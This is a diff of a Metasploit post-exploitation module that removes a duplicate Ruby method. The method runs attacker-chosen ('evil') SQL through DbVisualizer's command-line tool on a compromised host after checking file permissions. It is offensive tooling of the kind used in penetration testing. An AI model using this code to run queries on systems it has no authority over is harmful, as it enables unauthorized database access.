@@ -177,33 +177,6 @@ class Metasploit3 < Msf::Post
     return dbvis
   end
 
-
-  # Query execution method
-  def dbvis_query(dbvis,sql)
-    error =false
-    resp=''
-    if file?(dbvis)==true
-      f = session.fs.file.stat(dbvis)
-      if f.uid == Process.euid or Process.groups.include?f.gid
-        print_status("Trying to execute evil sql, it can take time ...")
-        args = "-connection #{datastore['DBALIAS']} -sql \"#{sql}\""
-        dbvis ="\"#{dbvis}\""
-        cmd = "#{dbvis} #{args}"
-        resp = cmd_exec(cmd)
-        vprint_line("")
-        vprint_status("#{resp}")
-        if resp =~ /denied|failed/i
-          error = true
-        end
-      else
-         print_error("User doesn't have enough rights to execute dbviscmd, aborting")
-      end
-    else
-      print_error("#{dbvis} is not a file")
-    end
-    return error
-  end
-
   # Query execution method
   def dbvis_query(dbvis,sql)
     error =false
